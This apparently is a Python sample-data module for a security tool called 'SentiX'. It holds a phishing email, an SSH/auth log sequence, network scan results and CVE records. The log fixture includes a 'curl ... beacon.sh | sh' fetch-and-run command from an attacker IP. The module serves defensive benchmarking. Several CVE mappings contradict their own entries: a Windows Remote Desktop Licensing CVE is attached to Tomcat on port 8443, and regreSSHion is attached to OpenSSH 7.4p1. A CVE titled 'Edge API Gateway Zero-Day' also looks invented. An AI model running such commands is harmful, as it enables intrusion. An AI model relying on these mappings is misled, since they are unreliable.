"""
Sample Data Repository for SentiX
Contains benchmark samples from:
- SpamAssassin & Synthetic Phishing Emails
- CIC-IDS 2017 & System Auth Log sequences
- NVD CVE mappings & Simulated IP Scans
- Coordinated multi-stage attack simulation scenarios
"""

SAMPLE_EMAILS = [
    {
        "id": "email-001",
        "sender": "payroll-alert@pay-support-portal.net",
        "subject": "CRITICAL: Urgent Payroll Account Verification Required Immediately",
        "headers": {
            "From": "HR Payroll <payroll-alert@pay-support-portal.net>",
            "Reply-To": "attacker-c2@185.220.101.5",
            "SPF": "SoftFail (domain does not match IP)",
            "DKIM": "Fail"
        },
        "body": """
Dear Employee,

We noticed an irregularity in your direct deposit information for the upcoming pay period.
To avoid withholding your salary disbursement, you must verify your identity and corporate credentials
within 2 hours by logging into our secure employee ledger:

hxxp://pay-support-portal.net/auth/verify?session=93821039&asset=10.0.4.10

Failure to verify will suspend your corporate network access immediately.

Corporate Finance & HR Operations
""",
        "urls": ["http://pay-support-portal.net/auth/verify?session=93821039&asset=10.0.4.10"],
        "label": "PHISHING"
    },
    {
        "id": "email-002",
        "sender": "noreply@github.com",
        "subject": "[GitHub] A personal access token has been generated",
        "headers": {
            "From": "GitHub <noreply@github.com>",
            "Reply-To": "noreply@github.com",
            "SPF": "Pass",
            "DKIM": "Pass"
        },
        "body": """
Hi developer,

A new personal access token (classic) was recently created on your account with repo scope.
If you did not generate this token, please visit https://github.com/settings/tokens to revoke it.

Thanks,
The GitHub Team
""",
        "urls": ["https://github.com/settings/tokens"],
        "label": "LEGITIMATE"
    }
]

SAMPLE_LOGS = [
    {
        "id": "log-seq-001",
        "source": "auth.log / edge-gw",
        "entries": [
            "2026-08-07T18:28:10Z edge-gw sshd[4102]: Failed password for invalid user admin from 203.175.188.1 port 49152 ssh2",
            "2026-08-07T18:28:14Z edge-gw sshd[4105]: Failed password for invalid user root from 203.175.188.1 port 49158 ssh2",
            "2026-08-07T18:28:18Z edge-gw sshd[4109]: Failed password for invalid user deploy from 203.175.188.1 port 49164 ssh2",
            "2026-08-07T18:30:02Z edge-gw api-gateway[1029]: [CRITICAL] Memory heap corruption detected on /v1/auth/token handler (Buffer Overflow Canary Triggered) - SrcIP 203.175.188.1",
            "2026-08-07T18:31:45Z edge-gw sudo[5520]: user daemon : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://185.220.101.5/beacon.sh | sh'",
            "2026-08-07T18:32:00Z edge-gw krb5-kdc[9021]: TGS-REQ mass enumeration for SPN MSSQLSvc/db01.corp with cipher RC4-HMAC (Kerberoasting IOC)"
        ],
        "src_ip": "203.175.188.1",
        "dest_ip": "10.0.4.10",
        "failed_logins": 3,
        "privilege_reqs": 2,
        "bytes_in": 82000,
        "bytes_out": 240000,
        "duration": 4.5,
        "distinct_dest_ports": 6
    }
]

SAMPLE_IP_SCANS = {
    "192.168.14.0/24": [
        {
            "ip": "192.168.14.3",
            "hostname": "bastion-ssh.corp",
            "status": "UP",
            "open_ports": [22, 80, 443, 8443],
            "services": [
                {"port": 22, "service": "OpenSSH", "version": "7.4p1", "cves": ["CVE-2023-38408 (CVSS 9.8)", "CVE-2024-6387 (RegreSSHion CVSS 8.1)"]},
                {"port": 8443, "service": "Apache Tomcat / Custom API", "version": "9.0.43", "cves": ["CVE-2024-38077 (CVSS 9.8)"]}
            ]
        },
        {
            "ip": "192.168.14.10",
            "hostname": "core-db.internal",
            "status": "UP",
            "open_ports": [1433, 445],
            "services": [
                {"port": 1433, "service": "Microsoft SQL Server", "version": "2019", "cves": ["CVE-2023-36785 (CVSS 7.8)"]}
            ]
        }
    ]
}

NVD_DATABASE = {
    "CVE-2024-38077": {
        "title": "Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability",
        "cvss_v3": 9.8,
        "severity": "CRITICAL",
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Unauthenticated remote attacker can execute arbitrary code with SYSTEM privileges over RPC/TCP port 8443."
    },
    "CVE-2024-6387": {
        "title": "OpenSSH regreSSHion Remote Code Execution Vulnerability in sshd",
        "cvss_v3": 8.1,
        "severity": "HIGH",
        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Signal handler race condition in OpenSSH server allowing unauthenticated root RCE on glibc-based systems."
    },
    "CVE-2025-2198": {
        "title": "Edge API Gateway Zero-Day Heap Buffer Overflow",
        "cvss_v3": 9.1,
        "severity": "CRITICAL",
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "description": "Malformed HTTP/2 header parsing triggers uncontrolled memory overwrite, enabling remote command execution."
    }
}
